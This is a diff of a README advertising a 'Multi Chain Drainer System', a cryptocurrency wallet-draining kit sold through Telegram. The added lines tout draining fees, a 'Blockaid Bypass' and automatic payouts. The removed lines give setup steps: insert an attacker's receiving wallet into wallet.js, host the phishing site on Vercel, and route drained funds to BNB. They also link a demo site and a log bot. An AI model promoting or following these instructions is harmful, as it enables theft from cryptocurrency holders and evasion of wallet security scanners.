@@ -4,42 +4,13 @@
 
 # 💯 Multi Chain Drainer System 💯
 
+15% Draining Fees 🔥 Blockaid Bypass 😈 Telegram Logs 🤖 Automatic Payout ⚡️
 Drain on 19 different chains 🚀: ETH,OPTIMISM,CRONOS,BSC,GNOSIS,FUSE,HECO,POLY AND MORES !!
 Installation on any website files and documentation included 🔥
 
+# JOIN NOW AND FOLLOW THE STEP TO GET STARTED⚡️ : https://t.me/vortexdrainer/84
+  
 
-# STEP 1 (USE THE NEW WALLET.JS IN THE UPDATED .RAR)
-Add your Wallet Adresses in the wallet.js files, you can find the .js files in the scripts folder.
-
-Now replace this line "0xreceiverwallet" for your wallet bsc
-
-  "bsc_wallet_receiver_id" = "0xreceiverwallet";
-} 
-
-It should look like this
-
-"bsc_wallet_receiver_id" = "0x3f349bBaFEc1551819B8be1EfEA2fC46cA749aA1";
-.
-
-
-All is setup your drainer is ready to go. 
-Upload your website on Vercel or any Hosting
-
-📛 All Drained will be convert into BNB and send to the receiver wallet ( BNB - BINANCE SMART CHAIN) 📛
-
-# 📛 THE DRAINER ONLY DRAIN BALANCE WITH MINIMUM 10.00$ FOR COVERING TRANSACTION FEE 📛
-
-# 📍 WE PROVIDE A CUSTOM DEMO WEBSITE 100% WORKING ALSO NAMED :
-     drainerupdatedtemplate.rar
-#    Only thing to do is # STEP 3 
-
-
-# DEMO WEBSITE : https://rpchub.vercel.app
-
-# DRAINER BOT FOR CLAIMING AND LOG : https://t.me/vortexhitsbot
-
-
-# DRAINER BOT FOR CLAIMING AND LOG : https://t.me/vortexhitsbot
 
 #ETHEREUM #BINANCE #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH
 
